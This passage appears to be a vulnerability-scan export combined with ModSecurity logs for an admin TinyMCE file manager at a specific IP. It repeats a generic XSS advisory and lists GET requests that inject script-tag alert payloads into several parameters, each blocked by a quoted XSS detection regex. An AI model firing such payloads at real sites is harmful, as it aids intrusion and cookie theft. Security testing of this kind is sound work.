class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang='&gt;&lt;script&gt;alert(258899)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=e5uev81d8kj2p4bfcflv042vf2
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:39</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:37 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(258899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsdawQAW0AAB7zKMwAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsdawQAW0AAB7zKMwAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366758</td><td class=xl24 width=64 >2015-03-31 18:43:30</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(650899)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=8kpl2e5kc1uekmf68gqn7rct17
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:40</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:39 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(650899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsd6wQAW0AAHhGMtUAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsd6wQAW0AAHhGMtUAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366759</td><td class=xl24 width=64 >2015-03-31 18:43:48</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain='&gt;&lt;script&gt;alert(303199)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=kmtveen6vuspulnj97b7305e30
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:41</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:40 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(303199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtseKwQAW0AAHzDqrsAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtseKwQAW0AAHzDqrsAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366760</td><td class=xl24 width=64 >2015-03-31 18:45:32</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(888299)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=a6q8a5vdcgcr8alqmma1q36ni4
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:42</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:41 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(888299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtseawQAW0AAD9hYNcAAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtseawQAW0AAD9hYNcAAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366761</td><td class=xl24 width=64 >2015-03-31 18:46:56</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain='&gt;&lt;script&gt;alert(445599)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac1cc4bcfb=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=u0uuvepullk7c8lv81cs0evba0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:44</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:42 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(445599)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtseqwQAW0AAHewA8sAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtseqwQAW0AAHewA8sAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366762</td><td class=xl24 width=64 >2015-03-31 18:47:17</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(669199)&lt;/script&gt;&lt;!--&amp;relative_url=0&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=p0enc6d6ibmu265voqtahsi721
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:45</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:44 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(669199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsfKwQAW0AAHee9@cAAAAA&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsfKwQAW0AAHee9@cAAAAA</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366763</td><td class=xl24 width=64 >2015-03-31 18:48:40</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain='&gt;&lt;script&gt;alert(343499)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=o3eu76moldi3oo7h2lhokgsce7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:46</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:45 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(343499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsfawQAW0AABvT@GcAAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsfawQAW0AABvT@GcAAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366764</td><td class=xl24 width=64 >2015-03-31 18:49:01</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


